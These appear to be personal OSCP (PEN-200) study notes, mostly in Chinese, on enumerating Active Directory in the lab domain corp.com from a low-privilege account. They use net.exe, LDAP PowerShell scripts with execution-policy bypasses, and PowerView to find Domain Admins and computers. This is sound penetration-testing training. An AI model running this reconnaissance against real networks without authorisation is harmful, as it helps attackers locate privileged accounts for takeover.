---
title: '[OSCP, PEN-200] Instructional notes - Part 6'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 6
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 5](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md) 內容

# Active Directory Introduction and Enumeration
[Active Directory Domain Services](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview) 通常稱為 Active Directory (AD) 允許 System Administrators 大規模更新和管理作業系統、應用程式、使用者和資料存取的服務。
## Active Directory - Introduction
Active Directory 本身就是一種服務，但它也充當 management layer。 AD 包含有關環境的關鍵資訊，儲存有關 `users`, `groups` 與 `computers` 的資訊，每個資訊稱為 objects。每個 object 上設定的權限決定了該物件在網域內的權限。
>[!Important]
>Active Directory（AD）環境高度依賴 Domain Name System（DNS） 服務。 因此，典型的 Domain Controller (DC) 通常也會同時運行 DNS 伺服器，並且 負責解析該網域的名稱（authoritative for a given domain）。

- 使用 [Organizational Units](https://en.wikipedia.org/wiki/Organizational_unit_(computing))（OU）來管理 objects
為了簡化管理，系統管理員通常會使用 Organizational Units 來分類不同的物件：\
OU 就像檔案系統的資料夾，用來存放 AD 內的物件。
    - `Computer objects` 代表 加入網域的伺服器或 workstation。
    - `User objects` 代表 可以登入網域的帳戶，並包含各種 attributes，如：
        - First Name
        - Last Name
        - Username
        - Phone Number等
- AD 運作機制: DC
當使用者嘗試登入網域時，會發送一個 request 到 Domain Controller (DC) 由 DC 來檢查該使用者是否有權限登入。
DC 是 整個網域的核心組件，存放所有：
    - OUs（組織單位）
    - Objects（物件）
    - Attributes（屬性）

因此當我們進行 AD 滲透測試時，會 特別關注 DC，因為它是 AD 最核心的目標之一。
- AD groups 與高權限帳戶
Objects 可以被分配到 AD Groups，這樣系統管理員就能夠一次性管理一組物件。例如：
某個 group member 可能會獲得 檔案伺服器存取權限。
某些 group 可能擁有 網域內的管理員權限。
     - (1) [Domain Admins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#domain-admins)
    Domain Admins Group Member 是網域中擁有最高權限的 Objects 之一，擁有整個網域的管理權限。\
如果 attacker 成功獲取此群組內成員的帳號，就可以完全 控制整個網域。
     - (2) Enterprise Admins
    AD 環境可以擁有多個網域（Domain Tree 或 Domain Forest）。
每個網域都有自己的 Domain Admins 群組。\
     Enterprise Admins Group 則擁有「所有網域」的最高權限，能 管理整個 AD 樹狀結構中的所有網域。

Enumeration 會使用多種工具來進行手動與自動化枚舉，其中大部分工具都會透過 LDAP（[Lightweight Directory Access Protocol](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol)） 來查詢 AD 內的物件資訊。

### Enumeration - Defining our Goals
如何透過 低權限帳號進行滲透測試。
[環境範例]
- 目標 滲透 `corp.com` 網域。
- 已經透過 Phishing Attack，成功取得了一個網域使用者的帳號密碼。
- 另一種可能是：目標組織主動提供我們一組使用者帳號，以模擬實際滲透測試（假設攻擊，Assumed Breach）。這樣可以幫助企業評估：如果攻擊者獲得初始存取權限，他們可以多快進行進一步的攻擊與 Lateral Movement。
- 可用帳號：
    - 帳戶是 stephanie
    - 具有 RDP 權限，可以連線到 Windows 11 workstation，該 workstation 已加入 corp.com 網域。
    - stephanie 並不是該機器的 Local Administrator ，這可能會影響我們執行某些命令或工具的權限。

#### Enumeration 的方式
從 stephanie 低權限帳號開始進行 AD enumeration，並且 透過這個帳號找到其他潛在的攻擊機會。**一旦我們獲取新的使用者帳號或電腦存取權限，就需要重新進行枚舉**。
- Pivoting(視角轉變) & Rinse and Repeat(反覆枚舉)
當我們獲得新帳號或新的電腦存取權限時，我們需要 重新枚舉:
    - 不同使用者的權限可能不同（即使表面上屬於相同的低權限使用者群組）。
    - 某些帳號可能擁有特定資源的存取權限，但 stephanie 可能沒有。
    - 系統管理員有時會額外賦予個別帳號更多權限，例如特定伺服器的存取權限。
    
### Active Directory - Manual Enumeration
stephanie 是低權限使用者，但有 RDP 存取權限
#### 1. 透過 RDP 登入 Windows 11
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:stephanie /d:corp.com /v:192.168.14ㄓ.75

```
>[!Warning]
>**避免 Kerberos 雙重跳躍問題（[Kerberos Double-Hop](https://posts.slayerlabs.com/double-hop/) Issue）**:\
建議使用 RDP，而非 PowerShell Remoting（WinRM），因為透過 WinRM 可能會導致 無法執行 AD 枚舉工具。\
Kerberos 雙重跳躍（Double-Hop）問題 會影響某些遠端命令的執行權限，詳細內容可參考 PEN-300 課程。\
![image](https://hackmd.io/_uploads/HyDm7BhsJx.png)

#### 2. 使用 net.exe 枚舉 AD 的使用者
使用 `net user /domain` 來列出 corp.com 網域內的所有使用者
```
PS C:\Users\stephanie> net user /domain
The request will be processed at a domain controller for domain corp.com.


User accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
Administrator            dave                     Guest
iis_service              jeff                     jeffadmin
jen                      krbtgt                   pete
stephanie
The command completed successfully.
```
> `Administrator`：內建的網域管理員帳號。\
`krbtgt`：Kerberos 票證授權服務帳號，可能與 Kerberos 身份驗證有關。\
`jeffadmin`：帳號名稱帶有 "admin"，可能是管理員帳戶，值得調查。

#### 3. 查詢特定使用者資訊
使用 `net user` 指令，針對 jeffadmin 進行更詳細的查詢
```
PS C:\Users\stephanie> net user jeffadmin /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jeffadmin
Full Name
...
Account expires              Never

...
Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/8/2024 3:47:01 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```
> jeffadmin 是 **Domain Admins** group member\
密碼不會過期
>> 如果我們能夠獲取 jeffadmin 的 credential，就能直接擁有 Domain Admin 權限。

#### 4. 使用 net.exe 查詢 AD 的群組
使用 `net group /domain` 指令，來查看網域內所有的群組
```
PS C:\Users\stephanie> net group /domain
The request will be processed at a domain controller for domain corp.com.

Group Accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*Debug
*Development Department
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Management Department
*Protected Users
*Read-only Domain Controllers
*Sales Department
*Schema Admins
The command completed successfully.
```
> [default Group](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)\
> `Domain Admins`: 整個網域的最高權限\
`Enterprise Admins`: 擁有多個網域的管理權限，通常在 Active Directory Forest 內才會出現\
`Sales Department`: 自訂群組，可能代表企業內部自行建立的部門群組

#### 5. 查詢特定群組的成員
針對 `Sales Department` 群組，查詢它有哪些成員
```
PS C:\Users\stephanie> net group "Sales Department" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Sales Department
Comment

Members

-------------------------------------------------------------------------------
pete                     stephanie
The command completed successfully.
```
> stephanie 及 pete 都是 Sales Department 群組

### Enumerating Active Directory using PowerShell and .NET Classes
如何利用 PowerShell 和 .NET 類別來枚舉 Active Directory（AD），並透過 LDAP 與 AD 互動

#### LDAP
>[!Note]
>LDAP（Lightweight Directory Access Protocol） 是一種用來查詢和修改目錄服務（如 Active Directory）的通訊協定。\
當使用者搜尋印表機、查詢使用者或群組資訊時，AD 會使用 LDAP 來處理查詢。\
LDAP 不僅限於 Active Directory，其他目錄服務（如 OpenLDAP）也使用 LDAP。
- LDAP 查詢路徑格式
需要特定的 [LDAP ADsPath](https://learn.microsoft.com/en-us/windows/win32/adsi/ldap-adspath?redirectedfrom=MSDN)格式 才能與 AD 溝通
```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
> - `HostName`：電腦名稱、IP 地址或網域名稱。通常尋找擁有最新資訊的 DC ([Primary Domain Controller](https://learn.microsoft.com/en-gb/troubleshoot/windows-server/active-directory/fsmo-roles) (PDC))
> - `PortNumber`（可選）：預設情況下，LDAP 使用 389（非加密） 或 636（SSL/TLS 加密）。
> - `DistinguishedName`（DN）：唯一標識 AD 內 Objects 的名稱，例：`CN=Stephanie,CN=Users,DC=corp,DC=com`


#### 1. 取得 Primary Domain Controller（PDC）
>[!Tip]
>**為什麼需要 PDC？**\
AD 通常有多個 DCs，但其中只有一個 PDC 持有最新的網域資訊。\
為了確保枚舉結果最準確，我們應該查詢 PDC，而不是隨機的 DC。

使用 .NET 類別 `System.DirectoryServices.ActiveDirectory.Domain` 來獲取當前網域資訊：
```
PS C:\Users\stephanie> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()


Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```
> PdcRoleOwner 欄位顯示 DC1.corp.com，表示 DC1 是 PDC

#### 2. 取得網域的 DN（Distinguished Name）
在 AD 中，每個 Objects 都有一個唯一識別名稱（DN，Distinguished Name）\
使用 ADSI（[Active Directory Services Interface](https://learn.microsoft.com/en-us/windows/win32/adsi/active-directory-service-interfaces-adsi)） 來取得網域的 DN
```
PS C:\Users\stephanie> ([adsi]'').distinguishedName
DC=corp,DC=com
```
>  透過 LDAP 查詢所需的 Distinguished Name

#### 3. 組合完整的 LDAP 查詢路徑
現在我們已經獲取：
- PDC 名稱（DC1.corp.com）
- 網域的 DN（DC=corp,DC=com）

將這些資訊組合成 LDAP 查詢路徑：
```
PS C:\Users\stephanie> $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
PS C:\Users\stephanie> $DN = ([adsi]'').distinguishedName
PS C:\Users\stephanie> $LDAP = "LDAP://$PDC/$DN"
PS C:\Users\stephanie> $LDAP
LDAP://DC1.corp.com/DC=corp,DC=com
```

#### 4. 完整 PowerShell Enumeration 腳本
```
# 取得 PDC 名稱
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

# 取得 DN（Distinguished Name）
$DN = ([adsi]'').distinguishedName 

# 組合 LDAP 路徑
$LDAP = "LDAP://$PDC/$DN"

# 顯示 LDAP 路徑
$LDAP
```
自動偵測 PDC 並生成正確的 LDAP 查詢路徑，使用 notepad 編輯寫成 `enumeration.ps1`
```
PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> notepad .\enumeration.ps1

$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
$LDAP

PS C:\Users\stephanie> .\enumeration.ps1
LDAP://DC1.corp.com/DC=corp,DC=com
```

### Adding Search Functionality to our Script
已經建置了所需的 LDAP 路徑，現在可以建立搜尋功能
#### 1. 使用 .NET 類別來進行 AD 搜尋
將使用 System.DirectoryServices 命名空間中的兩個重要類別：
- [DirectoryEntry](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0)：
代表 AD 內的一個物件（如 CN=Users,DC=corp,DC=com）。
我們將用它來指定 搜尋的起點（[SearchRoot](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher.searchroot?view=dotnet-plat-ext-6.0) property）。
- [DirectorySearcher](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-6.0)：
用來 執行 LDAP 查詢。
SearchRoot 屬性會指向 DirectoryEntry，告訴它 從哪裡開始搜尋。

>[!Note]
>- The DirectoryEntry class encapsulates an object in the AD service hierarchy (LDAP path)
>- The DirectorySearcher class performs queries against AD using LDAP. When creating an instance of DirectorySearcher, we must specify the AD service we want to query in the form of the SearchRoot property.
>- The DirectorySearcher documentation lists `FindAll()`, which returns a collection of all the entries found in AD.

```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

# 建立 DirectoryEntry 來指定搜尋的起點
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

# 建立 DirectorySearcher 來執行 LDAP 查詢
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```
#### 2. 在腳本中實作基本搜尋
編輯腳本:
```
PS C:\Users\stephanie> powershell -ep bypass    
PS C:\Users\stephanie> notepad .\enumeration.ps1
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()

PS C:\Users\stephanie> .\enumeration.ps1

Path
----
LDAP://DC1.corp.com/DC=corp,DC=com
LDAP://DC1.corp.com/CN=Users,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Computers,DC=corp,DC=com
LDAP://DC1.corp.com/OU=Domain Controllers,DC=corp,DC=com
LDAP://DC1.corp.com/CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=LostAndFound,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Infrastructure,DC=corp,DC=com
LDAP://DC1.corp.com/CN=ForeignSecurityPrincipals,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Program Data,DC=corp,DC=com
...

```
> 執行成功，但沒有過濾，結果過於龐大。
#### 3. 過濾搜尋結果
可以使用 LDAP 過濾條件\
只想查詢 所有使用者帳戶，可以使用 samAccountType=805306368：
```
$dirsearcher.filter="samAccountType=805306368"
```
編輯腳本並執行:
```
PS C:\Users\stephanie> notepad .\enumeration.ps1
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()

PS C:\Users\stephanie> .\enumeration.ps1

Path                                                         Properties
----                                                         ----------
LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=krbtgt,CN=Users,DC=corp,DC=com        {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=dave,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=stephanie,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jeff,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, usnchanged...}
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=iis_service,CN=Users,DC=corp,DC=com   {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=pete,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jen,CN=Users,DC=corp,DC=com           {logoncount, codepage, objectcategory, dscorepropagatio...
```
> 篩選出 AD 內所有的使用者帳號

我們的腳本列舉了比 net.exe 更多的群組，包括 Print Operators, IIS_IUSRS 等。這是因為我們列舉了所有 AD 對象，包括 Domain Local groups（而不僅僅是 global groups）。

#### 4. 查詢特定帳號 attribute
目前查詢中只顯示物件的 LDAP 路徑，若要列出每個使用者的詳細屬性。\
使用兩層迴圈來列出每個使用者的所有屬性：
```
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```
編輯腳本並執行:
```
PS C:\Users\stephanie> type .\enumeration.ps1
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}

PS C:\Users\stephanie> .\enumeration.ps1
...
logoncount                     {173}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}
name                           {jeffadmin}
pwdlastset                     {133066348088894042}
objectclass                    {top, person, organizationalPerson, user}
samaccounttype                 {805306368}
memberof                       {CN=Domain Admins,CN=Users,DC=corp,DC=com}
...
-------------------------------

```
> 可以查詢每個帳號的登入次數、密碼設定時間、所屬群組等關鍵資訊
> 只列出 `jeffadmin` 資訊

>[!Caution]
> 若遇到以下 Error，PowerShell 執行原則（Execution Policy） 禁止運行腳本，可以透過調整設定: `Set-ExecutionPolicy Unrestricted -Scope CurrentUser`
> 
>```
>PS C:\Users\stephanie> .\enumeration.ps1
>.\enumeration.ps1 : File >C:\Users\stephanie\enumeration.ps1 cannot be loaded >because running scripts is disabled on
>this system. For more information, see >about_Execution_Policies at >https:/go.microsoft.com/fwlink/?LinkID=135170.
>At line:1 char:1
>+ .\enumeration.ps1
>+ ~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : SecurityError: (:) [], >PSSecurityException
>    + FullyQualifiedErrorId : UnauthorizedAccess
>PS C:\Users\stephanie> Set-ExecutionPolicy Unrestricted ->Scope CurrentUser
>```

#### 5. 查詢特定使用者的群組
若只想 查看某個特定帳號的群組，可以修改過濾條件：
```
$dirsearcher.filter="name=jeffadmin"

$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }

    Write-Host "-------------------------------"
}

```
執行結果：
```
PS C:\Users\stephanie> type .\enumeration.ps1
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="name=jeffadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }

    Write-Host "-------------------------------"
}
PS C:\Users\stephanie> .\enumeration.ps1
CN=Domain Admins,CN=Users,DC=corp,DC=com
CN=Administrators,CN=Builtin,DC=corp,DC=com
-------------------------------
```
> 證明 jeffadmin 是 Domain Admins 成員，擁有最高權限！

#### 6. 讓腳本更靈活
避免手動修改搜尋條件，可以將它轉換為函數（Function），並允許 命令列參數：
```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```
先執行 enumeration.ps1，就可以直接使用 LDAPSearch\
`LDAPSearch -LDAPQuery "(samAccountType=805306368)"`
```
PS C:\Users\stephanie> type .\enumeration.ps1
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
PS C:\Users\stephanie> . .\enumeration.ps1
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=805306368)"

Path                                                         Properties
----                                                         ----------
LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=krbtgt,CN=Users,DC=corp,DC=com        {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=dave,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=stephanie,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jeff,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, usnchanged...}
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=iis_service,CN=Users,DC=corp,DC=com   {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=pete,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jen,CN=Users,DC=corp,DC=com           {logoncount, codepage, objectcategory, dscorepropagatio...

```
直接查詢 AD
```
LDAPSearch -LDAPQuery "(samAccountType=805306368)"  # 查詢所有使用者
LDAPSearch -LDAPQuery "(objectclass=group)"  # 查詢所有群組
LDAPSearch -LDAPQuery "(name=jeffadmin)"  # 查詢 jeffadmin
```
#### 7. foreach 每個 group 與 member
為了列舉網域中可用的每個群組並顯示使用者成員，我們可以將輸出匯入到一個新變數中，並使用 foreach 循環列印群組的每個屬性。
```
PS C:\Users\stephanie\Desktop> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
>> $group.properties | select {$_.cn}, {$_.member}
>> }
...
Sales Department              {CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
Management Department         CN=jen,CN=Users,DC=corp,DC=com
Development Department        {CN=Management Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=dave,CN=Users,DC=corp,DC=com}
...
```
上述在 Sales Department group 只看到 `pete` 與 `stephanie`
```
PS C:\Users\stephanie> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
PS C:\Users\stephanie> $sales.properties.member
CN=Development Department,DC=corp,DC=com
CN=pete,CN=Users,DC=corp,DC=com
CN=stephanie,CN=Users,DC=corp,DC=com
```
> 發現 `Development Department` 也是 Sales Department group 其中一員

### AD Enumeration with PowerView
介紹了一款強大的 Active Directory 枚舉工具 — [PowerView](https://powersploit.readthedocs.io/en/latest/Recon/)，它是一個 PowerShell 腳本，提供很多內建函數

#### 1. 如何載入 PowerView？
PowerView 已安裝在 `C:\Tools` 資料夾中
```
PS C:\Tools> . .\PowerView.ps1
```
或
```
PS C:\Tools> Import-Module .\PowerView.ps1
``` 
#### 2. 取得基本網域資訊
##### 2.1  查詢網域資訊 (Get-NetDomain)
```
PS C:\Tools> Get-NetDomain


Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```
##### 2.2 查詢所有網域使用者 (Get-NetUser)
```
PS C:\Tools> Get-NetUser

logoncount             : 565
badpasswordtime        : 3/1/2023 3:18:15 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=corp,DC=com
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 3/8/2025 9:00:20 AM
name                   : Administrator
objectsid              : S-1-5-21-1987370270-658905905-1781884369-500
samaccountname         : Administrator
```
> 包含：\
帳號名稱（samaccountname）\
是否是管理員（admincount）\
所屬群組（memberof）\
上次修改密碼時間（pwdlastset）\
上次登入時間（lastlogon）
##### 2.3 查詢使用者資訊 (Get-NetUser | select ..)
- 只顯示使用者名稱 (`Get-NetUser | select cn`)
```
PS C:\Tools> Get-NetUser | select cn

cn
--
Administrator
Guest
krbtgt
dave
stephanie
jeff
jeffadmin
iis_service
pete
jen
```
- 查詢使用者修改密碼與登入資訊 (`Get-NetUser | select cn,pwdlastset,lastlogon`)
```
PS C:\Tools> Get-NetUser | select cn,pwdlastset,lastlogon

cn            pwdlastset            lastlogon
--            ----------            ---------
Administrator 8/16/2022 5:27:22 PM  3/8/2025 9:04:00 AM
Guest         12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM
krbtgt        9/2/2022 4:10:48 PM   12/31/1600 4:00:00 PM
dave          9/7/2022 9:54:57 AM   3/8/2025 9:12:35 AM
stephanie     9/2/2022 4:23:38 PM   3/8/2025 9:01:06 AM
jeff          9/2/2022 4:27:20 PM   12/18/2023 11:55:16 PM
jeffadmin     9/2/2022 4:26:48 PM   1/8/2024 3:47:01 AM
iis_service   9/7/2022 5:38:43 AM   3/1/2023 3:40:02 AM
pete          9/6/2022 12:41:54 PM  2/1/2023 2:42:42 AM
jen           9/6/2022 12:43:01 PM  1/8/2024 1:26:03 AM
```
##### 2.4 查詢所有網域群組 (Get-NetGroup)
```
PS C:\Tools> Get-NetGroup | select cn

cn
--
...
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
Sales Department
Management Department
Development Department
Debug
```
##### 2.5 查詢特定群組的成員 (Get-NetGroup .. | select member)
查詢 Sales Department 的成員：
```
PS C:\Tools> Get-NetGroup "Sales Department" | select member

member
------
{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}

```
> 再次證明 Development Department 也是 Sales Department 的成員

>[!Important]
>`PowerView` vs `net.exe`\
>![image](https://hackmd.io/_uploads/r1Y83xqoye.png)


## Manual Enumeration - Expanding our Repertoire
深入 Active Directory（AD）環境的手動枚舉，透過各種技術收集更多關鍵資訊，並建立一個完整的網域地圖
### Enumerating Operating Systems
使用 PowerView 查詢 Active Directory（AD）內的所有電腦資訊，並確認作業系統類型
#### 1. 使用 PowerView 查詢網域內的所有電腦 (Get-NetComputer)
```
PS C:\Tools> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> Get-NetComputer

pwdlastset                    : 10/2/2022 10:19:40 PM
logoncount                    : 319
msds-generationid             : {89, 27, 90, 188...}
serverreferencebl             : CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC1,OU=Domain Controllers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 10/13/2022 11:37:06 AM
name                          : DC1
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1000
samaccountname                : DC1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 10/13/2022 6:37:06 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Standard
...
dnshostname                   : DC1.corp.com
...
```
#### 2. 過濾並清理輸出資訊 (Get-NetComputer | select operatingsystem,dnshostname)
```
PS C:\Tools> Get-NetComputer | select name,operatingsystem,dnshostname

name     operatingsystem              dnshostname
